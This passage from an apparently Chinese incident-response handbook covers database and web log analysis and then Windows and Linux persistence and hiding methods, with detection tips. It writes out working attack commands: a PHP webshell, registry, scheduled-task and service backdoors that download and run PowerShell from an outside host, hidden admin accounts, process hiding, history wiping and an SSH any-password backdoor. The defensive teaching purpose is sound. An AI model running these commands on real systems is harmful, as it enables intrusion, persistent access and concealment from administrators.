-rn|more URL访问量统计： cat /www/logs/access.2019-02-23.log | awk '{print $7}' | egrep '\\?|&amp;' | sort | uniq -c | sort -rn | more 脚本运行速度： 查出运行速度最慢的脚本 grep -v 0$ /www/logs/access.2019-02-23.log | awk -F '\\\" ' '{print $4\" \" $1}' web.log | awk '{print $1\" \"$8}' | sort -n -k 1 -r | uniq &gt; /tmp/slow_url.txt IP, URL 抽取： # tail -f /www/logs/access.2019-02-23.log | grep '/test.html' | awk '{print $1\" \"$7}' 参考链接： https://www.jb51.net/article/53954.htm https://www.jb51.net/article/58017.htm https://cloud.tencent.com/developer/article/1051427 第4篇:MSSQL日志分析常见的数据库攻击包括弱口令、SQL注入、提升权限、窃取备份等。对数据库日志进行分析，可以发现攻击行为，进一步还原攻击场景及追溯攻击源。 0x01 MSSQL日志分析首先，MSSQL数据库应启用日志记录功能，默认配置仅限失败的登录，需修改为失败和成功的登录，这样就可以对用户登录进行审核。 登录到SQL Server Management Studio，依次点击 管理–SQL Server 日志 双击日志存档文件即可打开日志文件查看器，并可以对日志进行筛选或者导出等操作。 另外，MSSQ提供了一个工具SQL Server Profiler ，方便查找和发现SQL执行的效率和语句问题。 日志分析案例： 在日志文件查看器中，选择筛选，在筛选设置中源设置为“登录”，应用筛选器，确定。 筛选后的结果，可以很清晰的识别用户登录信息，记录内容包括用户登录时间、登录是否成功、登录使用的账号以及远程登录时用户使用的IP地址。 如下图：客户端：192.168.204.1进行尝试弱口令登录，并发现其中有一条登录成功的记录。 0x02 SQL注入入侵痕迹在利用SQL注入漏洞的过程中，我们会尝试利用sqlmap的–os-shell参数取得shell，如操作不慎，可能留下一些sqlmap创建的临时表和自定义函数。我们先来看一下sqlmap os-shell参数的用法以及原理： 1、构造一个SQL注入点，开启Burp监听8080端口 sqlmap.py -u http://192.168.204.164/sql.asp?id=1 --os-shell --proxy=http://127.0.0.1:8080 HTTP通讯过程如下： 创建了一个临时表sqlmapoutput，调用存储过程执行系统命令将数据写入临时表，然后取临时表中的数据展示到前端。 通过查看数据库中最近新建的表的结构和内容，可以判断是否发生过sql注入漏洞攻击事件。 检查方法： 1、数据库表检查 2、检查xp_cmdshell等存储过程 xp_cmdshell在mssql2005之后的版本中是默认禁止的，查看xp_cmdshell是否被启用。 `Exec master.dbo.xp_cmdshell ‘whoami’ 3、需要结合web日志，通过查看日志文件的大小以及审计日志文件中的内容，可以判断是否发生过sql注入漏洞攻击事件。 第5篇:MySQL日志分析常见的数据库攻击包括弱口令、SQL注入、提升权限、窃取备份等。对数据库日志进行分析，可以发现攻击行为，进一步还原攻击场景及追溯攻击源。 0x01 Mysql日志分析general query log能记录成功连接和每次执行的查询，我们可以将它用作安全布防的一部分，为故障分析或黑客事件后的调查提供依据。 1、查看log配置信息 show variables like '%general%'; 2、开启日志 SET GLOBAL general_log = 'On'; 3、指定日志文件路径 #SET GLOBAL general_log_file = '/var/lib/mysql/mysql.log'; 比如，当我访问 /test.php?id=1，此时我们得到这样的日志： 190604 14:46:14 14 Connect root@localhost on 14 Init DB test 14 Query SELECT * FROM admin WHERE id = 1 14 Quit ` 我们按列来解析一下： 第一列:Time，时间列，前面一个是日期,后面一个是小时和分钟，有一些不显示的原因是因为这些sql语句几乎是同时执行的,所以就不另外记录时间了。 第二列:Id，就是show processlist出来的第一列的线程ID,对于长连接和一些比较耗时的sql语句,你可以精确找出究竟是那一条那一个线程在运行。 第三列:Command，操作类型，比如Connect就是连接数据库，Query就是查询数据库(增删查改都显示为查询)，可以特定过虑一些操作。 第四列:Argument，详细信息，例如 Connect root@localhost on 意思就是连接数据库，如此类推,接下面的连上数据库之后,做了什么查询的操作。 0x02 登录成功/失败我们来做个简单的测试吧，使用我以前自己开发的弱口令工具来扫一下，字典设置比较小，2个用户，4个密码，共8组。 MySQL中的log记录是这样子： Time Id Command Argument 190601 22:03:20 98 Connect root@192.168.204.1 on 98 Connect Access denied for user 'root'@'192.168.204.1' (using password: YES) 103 Connect mysql@192.168.204.1 on 103 Connect Access denied for user 'mysql'@'192.168.204.1' (using password: YES) 104 Connect mysql@192.168.204.1 on 104 Connect Access denied for user 'mysql'@'192.168.204.1' (using password: YES) 100 Connect root@192.168.204.1 on 101 Connect root@192.168.204.1 on 101 Connect Access denied for user 'root'@'192.168.204.1' (using password: YES) 99 Connect root@192.168.204.1 on 99 Connect Access denied for user 'root'@'192.168.204.1' (using password: YES) 105 Connect mysql@192.168.204.1 on 105 Connect Access denied for user 'mysql'@'192.168.204.1' (using password: YES) 100 Query set autocommit=0 102 Connect mysql@192.168.204.1 on 102 Connect Access denied for user 'mysql'@'192.168.204.1' (using password: YES) 100 Quit ` 你知道在这个口令猜解过程中，哪个是成功的吗？ 利用爆破工具，一个口令猜解成功的记录是这样子的： 190601 22:03:20 100 Connect root@192.168.204.1 on 100 Query set autocommit=0 100 Quit 但是，如果你是用其他方式，可能会有一点点不一样的哦。 Navicat for MySQL登录： 190601 22:14:07 106 Connect root@192.168.204.1 on 106 Query SET NAMES utf8 106 Query SHOW VARIABLES LIKE 'lower_case_%' 106 Query SHOW VARIABLES LIKE 'profiling' 106 Query SHOW DATABASES 命令行登录： 190601 22:17:25 111 Connect root@localhost on 111 Query select @@version_comment limit 1 190601 22:17:56 111 Quit 这个差别在于，不同的数据库连接工具，它在连接数据库初始化的过程中是不同的。通过这样的差别，我们可以简单判断出用户是通过连接数据库的方式。 另外，不管你是爆破工具、Navicat for MySQL、还是命令行，登录失败都是一样的记录。 登录失败的记录： 102 Connect mysql@192.168.204.1 on 102 Connect Access denied for user 'mysql'@'192.168.204.1' (using password: YES) 利用shell命令进行简单的分析： #有哪些IP在爆破？ grep \"Access denied\" mysql.log |cut -d \"'\" -f4|uniq -c|sort -nr 27 192.168.204.1 #爆破用户名字典都有哪些？ grep \"Access denied\" mysql.log |cut -d \"'\" -f2|uniq -c|sort -nr 13 mysql 12 root 1 root 1 mysql 在日志分析中，特别需要注意一些敏感的操作行为，比如删表、备库，读写文件等。关键词：drop table、drop function、lock tables、unlock tables、load_file() 、into outfile、into dumpfile。 敏感数据库表：SELECT * from mysql.user、SELECT * from mysql.func 0x03 SQL注入入侵痕迹在利用SQL注入漏洞的过程中，我们会尝试利用sqlmap的–os-shell参数取得shell，如操作不慎，可能留下一些sqlmap创建的临时表和自定义函数。我们先来看一下sqlmap os-shell参数的用法以及原理： 1、构造一个SQL注入点，开启Burp监听8080端口 sqlmap.py -u http://192.168.204.164/sql.php?id=1 --os-shell --proxy=http://127.0.0.1:8080 HTTP通讯过程如下： 创建了一个临时文件tmpbwyov.php，通过访问这个木马执行系统命令，并返回到页面展示。 tmpbwyov.php： &amp;1\\n\";function f($n){global $z;return is_callable($n)and!in_array($n,$z);}if(f('system')){ob_start();system($c);$w=ob_get_contents();ob_end_clean();}elseif(f('proc_open')){$y=proc_open($c,array(array(pipe,r),array(pipe,w),array(pipe,w)),$t);$w=NULL;while(!feof($t[1])){$w.=fread($t[1],512);}@proc_close($y);}elseif(f('shell_exec')){$w=shell_exec($c);}elseif(f('passthru')){ob_start();passthru($c);$w=ob_get_contents();ob_end_clean();}elseif(f('popen')){$x=popen($c,r);$w=NULL;if(is_resource($x)){while(!feof($x)){$w.=fread($x,512);}}@pclose($x);}elseif(f('exec')){$w=array();exec($c,$w);$w=join(chr(10),$w).chr(10);}else{$w=0;}print \"\".$w.\"\";?&gt;` 创建了一个临时表sqlmapoutput，调用存储过程执行系统命令将数据写入临时表，然后取临时表中的数据展示到前端。 通过查看网站目录中最近新建的可疑文件，可以判断是否发生过sql注入漏洞攻击事件。 检查方法： 1、检查网站目录下，是否存在一些木马文件： 2、检查是否有UDF提权、MOF提权痕迹 检查目录是否有异常文件 mysql\\lib\\plugin c:/windows/system32/wbem/mof/ 检查函数是否删除 select * from mysql.func 3、结合web日志分析。 第三章：权限维持篇第1篇：Windows权限维持–隐藏篇0x00 前言攻击者在获取服务器权限后，通常会用一些后门来维持权限，如果你想让你的后门保持的更久些，那么请隐藏好它，使之不易被管理员发现。 0x01 隐藏文件1、利用文件属性 最简单的一种隐藏文件的方式，文件右键属性，勾选隐藏，点击确定后，在这个文件里看不到刚刚的文件了。 如果要让文件显示出来，就点击查看，勾选显示隐藏的文件，文件就显示出来。 如何真正隐藏文件？ 使用Attrib +s +a +h +r命令就是把原本的文件夹增加了系统文件属性、存档文件属性、只读文件属性和隐藏文件属性。 attrib +s +a +h +r D:\\test\\project\\test.txt 这样就做到了真正的隐藏，不管你是否显示隐藏文件，此文件夹都看不见。 破解隐藏文件： 打开电脑文件夹选项卡，取消”隐藏受保护的操作系统文件“勾选，把”隐藏文件和文件夹“下面的单选选择“显示隐藏的文件、文件夹和驱动器”。 2、利用ADS隐藏文件内容 ​ 在服务器上echo一个数据流文件进去，比如index.php是网页正常文件，我们可以这样子搞： echo ^&lt;?php @eval($_POST['chopper']);?^&gt; &gt; index.php:hidden.jpg 这样子就生成了一个不可见的shell hidden.jpg，常规的文件管理器、type命令，dir命令、del命令发现都找不出那个hidden.jpg的。 问题1：如何查看index.php:hidden.jpg内容呢？ 进入文件所在目录，notepad index.php:hidden.jpg 或者 dir /r 问题2：如何删除index.php:hidden.jpg？ 直接删除index.php即可 3、驱动级文件隐藏 驱动隐藏我们可以用过一些软件来实现，软件名字叫：Easy File Locker 下载链接： http://www.xoslab.com/efl.html 如果你在网站目录未查找到相关文件，且系统目录存在存在以下文件： c:\\WINDOWS\\xlkfs.dat c:\\WINDOWS\\xlkfs.dll c:\\WINDOWS\\xlkfs.ini c:\\WINDOWS\\system32\\drivers\\xlkfs.sys 那么你，应该是遭遇了驱动级文件隐藏。 如何清除？ 1、查询服务状态： sc qc xlkfs 2、停止服务： net stop xlkfs 服务停止以后，经驱动级隐藏的文件即可显现 3、删除服务： sc delete xlkfs 4、删除系统目录下面的文件，重启系统，确认服务已经被清理了。 隐藏文件的方式还有很多，比如伪装成一个系统文件夹图标，利用畸形文件名、保留文件名无法删除，甚至取一个与系统文件很像的文件名并放在正常目录里面，很难辨别出来。 这些隐藏文件的方式早已不再是秘密，而更多的恶意程序开始实现“无文件”攻击，这种方式极难被发现。 0x02 隐藏账号window 隐藏系统用户操作，CMD命令行下，建立了一个用户名为“test$”，密码为“abc123!”的简单隐藏账户,并且把该隐藏账户提升为了管理员权限。 PS:CMD命令行使用”net user”,看不到”test$”这个账号，但在控制面板和本地用户和组是可以显示此用户的。 克隆账号制作过程： 1、“开始”→“运行”，输入“regedt32.exe”后回车,需要到“HKEY_LOCAL_MACHINE\\SAM\\SAM”，单机右建权限，把名叫：administrator的用户给予：完全控制以及读取的权限，在后面打勾就行，然后关闭注册表编辑器，再次打开即可。 2、来到注册表编辑器的“HKEY_LOCAL_MACHINE\\SAM\\SAM\\Domains\\Account\\Users\\Names”处，点击test$用户，得到在右边显示的键值中的“类型”一项显示为0x3ec，找到箭头所指目录。 3、找到administrator所对应的的项为“000001F4”，将“000001F4”的F值复制到“000003EC”的F值中，保存。 4、分别test$和“000003EC导出到桌面，删除test$用户 net user test$ /del 5、将刚才导出的两个后缀为.reg的注册表项导入注册表中。这样所谓的隐藏账户就创建好了。PS：不管你是在命令提示符下输入net user 或者在系统用户管理界面都是看不到test$这个账户的，只有在注册表中才能看得到。 检测和清理方法： 使用D盾_web查杀工具，使用克隆账号检测功能进行查看，可检测出隐藏、克隆账号。 0x03 端口复用通过端口复用来达到隐藏端口的目的，在Window下，如何实现端口复用呢？ 前阵子，@Twi1ight公布了一种基于内置系统服务的端口复用后门方法，利用WinRM服务，一条命令实现端口复用后门： winrm set winrm/config/service @{EnableCompatibilityHttpListener=\"true\"} 一般开启WinRM服务作为远程管理，但还是第一次听到可以作为端口复用，一种简单容易实现的端口复用方式。假设，攻击者已获取到administrator账号密码，连接远程WinRM服务执行命令： 当执行这条命令的同时，将在安全日志中留下痕迹， 另外，可以通过代码实现端口复用重定向，工具：https://github.com/crabkun/Switcher 0x04 进程注入进程注入，一直是病毒木马的惯用手段，同时，它也是一种隐藏技术。在常见的渗透测试框架中，进程注入是怎么做的以及我们如何通过工具排查出来？ 1、meterpreter会话注入 当前权限无法获取hash值，查看目前系统进程 通过migrate将进程注入到system进程后，成功获得hash值。 Window后门排查： 通过TCPview显示已建立的TCP连接，我们可以看到异常的连接，同时，恶意软件将以绿色显示不到一秒钟，然后变成红色消失，如此循环。 2、Empire会话进程注入 通过psinject模块进行会话注入，直接输入ps选择一个SYSTEM权限的进程PID，使用进程注入模块，来获取权限。如下图： Window后门排查：利用process monitor或者火绒剑监控进程都可以定位到注入进程。 3、Cobalt Strike进程注入 选择进程，点击inject，随后选择监听器，点击choose，即可发现Cobaltstrike弹回了目标机的一个新会话，这个会话就是成功注入到某进程的beacon。 Window后门排查：利用process monitor捕捉通信过程，有规律的请求取决于sleep设置的间隔。 0x05 结束本文主要介绍了Window下的几种隐藏技术，包括隐藏文件、隐藏账号、端口复用、进程注入等方面的简单实现及其排查技巧。仅作抛砖引玉之用，欢迎留言分享。 参考链接： Canisrufus:一款基于Python的Windows隐藏后门 https://github.com/maldevel/canisrufus windows常见backdoor、权限维持方法及排查技术 https://xz.aliyun.com/t/4842 TALES OF A BLUE TEAMER: DETECTING POWERSHELL EMPIRE SHENANIGANS WITH SYSINTERNALS https://holdmybeersecurity.com/2019/02/27/sysinternals-for-windows-incident-response/ Hide Toolz 进程隐藏工具 官网地址:https://www.hidetoolz.com/ HideToolz是一款简单小巧的软件，可以隐藏进程，一键隐藏你想隐藏的程序 Cymothoa注入工具 cs 进程注入 https://bbs.ichunqiu.com/thread-53003-1-1.html Metasploit注入 dllhttps://blog.csdn.net/Fly_hps/article/details/80427707 几种后门和权限维持技术外还有像是dll劫持、一些软件的插件后门、office后门等。 https://blog.csdn.net/qq_33020901/article/details/89504902 第2篇：Windows权限维持–后门篇关键词：Windows系统后门、权限维持 在获取服务器权限后，通常会用一些后门技术来维持服务器权限，服务器一旦被植入后门，攻击者便如入无人之境。本文将对常见的window服务端自启动后门技术进行解析，知己知彼方能杜绝后门。 0x01 注册表自启动 通过修改注册表自启动键值，添加一个木马程序路径，实现开机自启动。 常用的注册表启动键： # Run键 HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run # Winlogon\\Userinit键 HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\WindowsNT\\CurrentVersion\\Winlogon HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\WindowsNT\\CurrentVersion\\Winlogon 类似的还有很多,关键词：注册表启动键值。 使用以下命令可以一键实现无文件注册表后门： reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /v \"Keyname\" /t REG_SZ /d \"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -nop -w hidden -c \\\"IEX ((new-object net.webclient).downloadstring('http://192.168.28.142:8888/logo.gif'))\\\"\" /f Logon Scripts 后门 注册表路径：HKEY_CURRENT_USER\\Environment\\ 创建字符串键值： UserInitMprLogonScript，键值设置为bat的绝对路径：c:\\test.bat userinit后门 在用户进行登陆时，winlogon运行指定的程序。根据官方文档,可以更改它的值来添加与删除程序。 利用USERINIT注册表键实现无文件后门： [HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon] \"Userinit\"=\"C:\\\\Windows\\\\system32\\\\userinit.exe,C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe -nop -w hidden -c \\\"IEX ((new-object net.webclient).downloadstring('http://192.168.28.142:8888/logo.gif'))\\\"\" 0x02 组策略设置脚本启动 运行gpedit.msc进入本地组策略，通过Windows设置的“脚本(启动/关机)”项来说实现。因为其极具隐蔽性，因此常常被攻击者利用来做服务器后门。 容易遇到的问题：脚本需全路径，如C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe 0x03 计划任务 通过window系统的任务计划程序功能实现定时启动某个任务，执行某个脚本。 使用以下命令可以一键实现： schtasks /create /sc minute /mo 1 /tn \"Security Script\" /tr \"powershell.exe -nop -w hidden -c \\\"IEX ((new-object net.webclient).downloadstring(\\\"\\\"\\\"http://192.168.28.142:8888/logo.gif\\\"\\\"\\\"))\\\"\" 容易遇到的问题：cmd命令行执行单引号会被替换成双引号，故这里使用三个双引号替代。 计划脚本每 1 分钟运行一次。 0x04 服务自启动 通过服务设置自启动，结合powershell实现无文件后门。 使用以下命令可实现： sc create \"KeyName\" binpath= \"cmd /c start powershell.exe -nop -w hidden -c \\\"IEX ((new-object net.webclient).downloadstring('http://192.168.28.142:8888/logo.gif'))\\\"\" sc description KeyName \"Just For Test\" //设置服务的描述字符串 sc config Name start= auto //设置这个服务为自动启动 net start Name //启动服务 成功创建了一个自启动服务 0x05 WMI后门 在2015年的blackhat大会上Matt Graeber介绍了一种无文件后门就是用的WMI。这里可以利用一个工具powersploit，下面用它的Persistence模块来示范一个简单的例子。 Import-Module .\\Persistence\\Persistence.psm1 $ElevatedOptions = New-ElevatedPersistenceOption -PermanentWMI -Daily -At '3 PM' $UserOptions = New-UserPersistenceOption -Registry -AtLogon Add-Persistence -FilePath .\\EvilPayload.ps1 -ElevatedPersistenceOption $ElevatedOptions -UserPersistenceOption $UserOptions -Verbose 0x06 dll劫持 如果在进程尝试加载一个DLL时没有指定DLL的绝对路径，那么Windows会尝试去指定的目录下查找这个DLL；如果攻击者能够控制其中的某一 个目录，并且放一个恶意的DLL文件到这个目录下，这个恶意的DLL便会被进程所加载，从而造成代码执行。 比较常用的如LPK.dll的劫持： win7及win7以上系统增加了KnownDLLs保护，需要在注册表： HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\SessionManager\\ExcludeFromKnownDlls 下添加 “lpk.dll” 才能顺利劫持： 0x07 COM劫持 利用COM劫持技术，最为关键的是dll的实现以及CLSID的选择，通过修改CLSID下的注册表键值，实现对CAccPropServicesClass和MMDeviceEnumerator劫持，而系统很多正常程序启动时需要调用这两个实例。这种方法可以绕过Autoruns对启动项的检测。 0x08 远程控制 远控木马是一种恶意程序，其中包括在目标计算机上用于管理控制的后门。远程访问木马通常与用户请求的程序（如游戏程序）一起，是一种看不见的下载，或作为电子邮件附件发送。一旦主机系统被攻破，入侵者可以利用它来向其他易受感染的计算机分发远程访问木马，从而建立僵尸网络。 一般分为客户端和服务端，如：灰鸽子、上兴远控、梦想时代、QuasarRAT等。 0x09 结束语 未知攻焉知防，本文分享了几种Window下的自动启权限维持技术。管理员在平时运维过程应当保持警惕，掌握一定的入侵排查技巧，及时进行系统补丁更新，定期对服务器安全检查，才能有效地预防后门。 参考文章： 常见的几种Windows后门持久化方式：https://www.freebuf.com/vuls/195906.html windows常见后门隐藏和权限维持方法 https://blog.csdn.net/qq_33020901/article/details/89504902 http://xnianq.cn/2018/07/23/windows%E5%90%8E%E9%97%A8%E7%A7%8D%E6%A4%8D%E6%96%B9%E5%BC%8F%E6%94%B6%E9%9B%86/ 基于Python的隐秘Windows后门，使用Github作为命令和控制服务器 https://github.com/maldevel/canisrufus 注册表位置参考 http://www.360doc.com/content/12/0217/15/1309227_187374989.shtml https://www.secpulse.com/archives/103301.html WMI后门参考 http://www.hackdig.com/11/hack-40748.htm https://blog.csdn.net/qq_17204441/article/details/91863383 无文件WMI和PowerShell后门 Windows 下的权限维持：https://www.anquanke.com/post/id/171528 Windows下的权限维持（二）https://www.anquanke.com/post/id/172851 第3篇：Linux权限维持–隐藏篇0x00 前言攻击者在获取服务器权限后，会通过一些技巧来隐藏自己的踪迹和后门文件，本文介绍Linux下的几种隐藏技术。 0x01 隐藏文件Linux 下创建一个隐藏文件：touch .test.txt touch 命令可以创建一个文件，文件名前面加一个 点 就代表是隐藏文件,如下图： 一般的Linux下的隐藏目录使用命令ls -l是查看不出来的，只能查看到文件及文件夹，查看Linux下的隐藏文件需要用到命令：ls -al 这里，我们可以看到在/tmp下，默认存在多个隐藏目录，这些目录是恶意文件常用来藏身的地方。如/temp/.ICE-unix/、/temp/.Test-unix/、/temp/.X11-unix/、/temp/.XIM-unix/ 0x02 隐藏文件时间戳Unix 下藏后门必须要修改时间，否则很容易被发现，直接利用 touch 就可以了。 比如参考 index.php 的时间，再赋给 webshell.php，结果两个文件的时间就一样了。 利用方法 touch -r index.php webshell.php 或者直接将时间戳修改成某年某月某日。如下 2014 年 01 月 02 日。 touch -t 1401021042.30 webshell.php 0x03 隐藏权限在Linux中，使用chattr命令来防止root和其他管理用户误删除和修改重要文件及目录，此权限用ls -l是查看不出来的，从而达到隐藏权限的目的。 这个技巧常被用在后门，变成了一些难以清除的后门文件，令很多新手朋友感到头疼。 chattr +i evil.php 锁定文件 lsattr evil.php 属性查看 chattr -i evil.php 解除锁定 rm -rf 1.evil.php 删除文件 0x04 隐藏历史操作命令在shell中执行的命令，不希望被记录在命令行历史中，如何在linux中开启无痕操作模式呢？ 技巧一：只针对你的工作关闭历史记录 [space]set +o history 备注：[space] 表示空格。并且由于空格的缘故，该命令本身也不会被记录。 上面的命令会临时禁用历史功能，这意味着在这命令之后你执行的所有操作都不会记录到历史中，然而这个命令之前的所有东西都会原样记录在历史列表中。 要重新开启历史功能，执行下面的命令： [Space]set -o history 它将环境恢复原状，也就是你完成了你的工作，执行上述命令之后的命令都会出现在历史中。 技巧二：从历史记录中删除指定的命令 假设历史记录中已经包含了一些你不希望记录的命令。这种情况下我们怎么办？很简单。通过下面的命令来删除： history | grep \"keyword\" 输出历史记录中匹配的命令，每一条前面会有个数字。从历史记录中删除那个指定的项： history -d [num] 这种技巧是关键记录删除，或者我们可以暴力点，比如前150行是用户的正常操作记录，150以后是攻击者操作记录。我们可以只保留正常的操作，删除攻击痕迹的历史操作记录，这里，我们只保留前150行： sed -i '150,$d' .bash_history 0x05 隐藏远程SSH登陆记录#隐身登录系统，不会被w、who、last等指令检测到。 ssh -T root@127.0.0.1 /bin/bash -i 不记录ssh公钥在本地.ssh目录中 ssh -o UserKnownHostsFile=/dev/null -T user@host /bin/bash –i 0x06 端口复用通过端口复用来达到隐藏端口的目的，在Linux下，如何实现端口复用呢？ 第一种方式：通过SSLH在同一端口上共享SSH与HTTPS #安装SSLH sudo apt-get install sslh #配置SSLH 编辑 SSLH 配置文件： sudo vi /etc/default/sslh 1、找到下列行：Run=no 将其修改为：Run=yes 2、修改以下行以允许 SSLH 在所有可用接口上侦听端口 443 DAEMON_OPTS=\"--user sslh --listen 0.0.0.0:443 --ssh 127.0.0.1:22 --ssl 127.0.0.1:443 --pidfile /var/run/sslh/sslh.pid\" 第二种方式：利用IPTables进行端口复用 # 端口复用链 iptables -t nat -N LETMEIN # 端口复用规则 iptables -t nat -A LETMEIN -p tcp -j REDIRECT --to-port 22 # 开启开关 iptables -A INPUT -p tcp -m string --string 'threathuntercoming' --algo bm -m recent --set --name letmein --rsource -j ACCEPT # 关闭开关 iptables -A INPUT -p tcp -m string --string 'threathunterleaving' --algo bm -m recent --name letmein --remove -j ACCEPT # let's do it iptables -t nat -A PREROUTING -p tcp --dport 80 --syn -m recent --rcheck --seconds 3600 --name letmein --rsource -j LETMEIN 利用方式： #开启复用 echo threathuntercoming | socat - tcp:192.168.28.128:80 #ssh使用80端口进行登录 ssh -p 80 root@192.168.28.128 #关闭复用 echo threathunterleaving | socat - tcp:192.168.28.128:80 具体文章详见：远程遥控 IPTables 进行端口复用 0x07 进程隐藏管理员无法通过相关命令工具查找到你运行的进程，从而达到隐藏目的，实现进程隐藏。 第一种方法：libprocesshider github项目地址：https://github.com/gianlucaborello/libprocesshider 利用 LD_PRELOAD 来实现系统函数的劫持，实现如下 # 下载程序编译 git clone https://github.com/gianlucaborello/libprocesshider.git cd libprocesshider/ &amp;&amp; make # 移动文件到/usr/local/lib/目录下 cp libprocesshider.so /usr/local/lib/ # 把它加载到全局动态连接局 echo /usr/local/lib/libprocesshider.so &gt;&gt; /etc/ld.so.preload 测试：运行 evil_script.py， 此时发现在top 与 ps 中都无法找到 evil_script.py， cpu 使用率高,但是却找不到任何占用cpu高的程序。 如何在Linux中发现隐藏的进程， unhide 是一个小巧的网络取证工具，能够发现那些借助rootkit，LKM及其它技术隐藏的进程和TCP / UDP端口。这个工具在Linux，UNIX类，MS-Windows等操作系统下都可以工作。 下载地址：http://www.unhide-forensics.info/ # 安装 sudo yum install unhide # 使用 unhide [options] test_list 使用unhide proc发现隐藏进程evil_script.py，如下图所示： 第二种方法：进程注入工具linux-inject linux-inject是用于将共享对象注入Linux进程的工具 github项目地址： https://github.com/gaffe23/linux-inject.git # 下载程序编译 git clone https://github.com/gaffe23/linux-inject.git cd linux-inject &amp;&amp; make # 测试进程 ./sample-target # 进程注入 ./inject -n sample-target sample-library.so 验证进程注入成功，如下图所示： Cymothoa是一款隐秘的后门工具。它通过向目标主机活跃的进程注入恶意代码，从而获取和原进程相同的权限。该工具最大的优点就是不创建新的进程，不容易被发现。 下载地址：https://sourceforge.net/projects/cymothoa/files/cymothoa-1-beta/ # 下载解压 wget https://jaist.dl.sourceforge.net/project/cymothoa/cymothoa-1-beta/cymothoa-1-beta.tar.gz tar zxvf cymothoa-1-beta.tar.gz # cd cymothoa-1-beta &amp;&amp; make 0x07 结语本文主要介绍了Linux下的几种隐藏技术，包括隐藏文件、隐藏权限、隐藏历史操作命令、端口复用、进程隐藏等方面的技巧。仅作抛砖引玉之用，欢迎留言分享。 参考文章： Tiny Shell 这款工具通过在源码中设置PROCESS_NAME为bash，以使得其运行后的进程名显示为bash。在恶意代码中通过设置具有迷惑性的进程名字，以达到躲避管理员检查的目的。 https://github.com/orangetw/tsh 参考文章：https://www.freebuf.com/sectool/138350.html mount-bind 利用mount —bind 将另外一个目录挂载覆盖至/proc/目录下指定进程ID的目录 聊一聊Linux下进程隐藏的常见手法及侦测手段https://www.anquanke.com/post/id/160843 反入侵之发现后门利用mount-bind将进程和端口信息隐匿https://www.freebuf.com/articles/network/140535.html https://blog.csdn.net/liuqz2009/article/details/43530201Linux 共享库注入后门 linux 进程注入后门工具Cymothoa 如何隐藏你的 Linux 的命令行历史https://www.linuxprobe.com/hidden-cmd-history.html 利用sslh实现端口复用https://www.bbsmax.com/A/QW5YwpWezm/ 远程遥控 IPTables 进行端口复用https://www.freebuf.com/articles/network/137683.html Venom 多级代理工具 linux 下隐藏进程的一种方法及遇到的坑 https://www.jb51.net/article/147024.htm 如何在 Linux/Unix/Windows 中发现隐藏的进程和端口https://linux.cn/article-9288-1.html 第4篇：Linux权限维持–后门篇本文将对Linux下常见的权限维持技术进行解析，知己知彼百战不殆。 1、一句话添加用户和密码 添加普通用户： # 创建一个用户名guest，密码123456的普通用户 useradd -p `openssl passwd -1 -salt 'salt' 123456` guest # useradd -p 方法 ` ` 是用来存放可执行的系统命令,\"$()\"也可以存放命令执行语句 useradd -p \"$(openssl passwd -1 123456)\" guest # chpasswd方法 useradd guest;echo 'guest:123456'|chpasswd # echo -e方法 useradd test;echo -e \"123456\\n123456\\n\" |passwd test 添加root用户： # 创建一个用户名guest，密码123456的root用户 useradd -p `openssl passwd -1 -salt 'salt' 123456` guest -o -u 0 -g root -G root -s /bin/bash -d /home/test 可疑用户排查技巧： # 查询特权用户特权用户(uid 为0) [root@localhost ~]# awk -F: '$3==0{print $1}' /etc/passwd # 查询可以远程登录的帐号信息 [root@localhost ~]# awk '/\\$1|\\$6/{print $1}' /etc/shadow # 除root帐号外，其他帐号是否存在sudo权限。如非管理需要，普通帐号应删除sudo权限 [root@localhost ~]# more /etc/sudoers | grep -v \"^#\\|^$\" | grep \"ALL=(ALL)\" 2、SUID Shell Suid shell是一种可用于以拥有者权限运行的shell。 配合普通用户权限使用 cp /bin/bash /tmp/shell chmod u+s /tmp/shell 使用guest用户登录就可疑获取root权限。 备注：bash2针对suid做了一些防护措施，需要使用-p参数来获取一个root shell。另外，普通用户执行这个SUID shell时，一定要使用全路径。 排查技巧： # 在Linux中查找SUID设置的文件 find . -perm /4000 # 在Linux中查找使用SGID设置的文件 find . -perm /2000 # 取消s权限 chmod u-s /tmp/shell 3、ssh公私钥免密登录 在客户端上生成一对公私钥，然后把公钥放到服务器上（~/.ssh/authorized_keys），保留私钥。当ssh登录时，ssh程序会发送私钥去和服务器上的公钥做匹配。如果匹配成功就可以登录了。 客户端： ssh-keygen -t rsa 过程中按三次回车，执行结束如下图: 进入/root/.ssh/文件夹，查看文件夹的内容，如下所示： 其中 id_rsa为私钥，id_rsa.pub为公钥，接下来打开id_rsa.pub，将内容复制到服务器。将id_rsa.pub的内容追加到/root/.ssh/authorized_keys内，配置完成。 排查技巧：查看/root/.ssh/authorized_keys是否被修改。 4、软连接 在sshd服务配置运行PAM认证的前提下，PAM配置文件中控制标志为sufficient时只要pam_rootok模块检测uid为0即root权限即可成功认证登陆。通过软连接的方式，实质上PAM认证是通过软连接的文件名 /tmp/su 在/etc/pam.d/目录下寻找对应的PAM配置文件(如: /etc/pam.d/su)，任意密码登陆的核心是auth sufficient pam_rootok.so，所以只要PAM配置文件中包含此配置即可SSH任意密码登陆，除了su中之外还有chsh、chfn同样可以。 在目标服务器上执行一句话后门： ln -sf /usr/sbin/sshd /tmp/su;/tmp/su -oPort=8888 执行完之后，任何一台机器ssh root@IP -p 8888，输入任意密码，成功登录。 排查技巧：进程、端口都可以发现异常， kill -s 9 PID 结束进程即可清除后门。 5、SSH wrapper 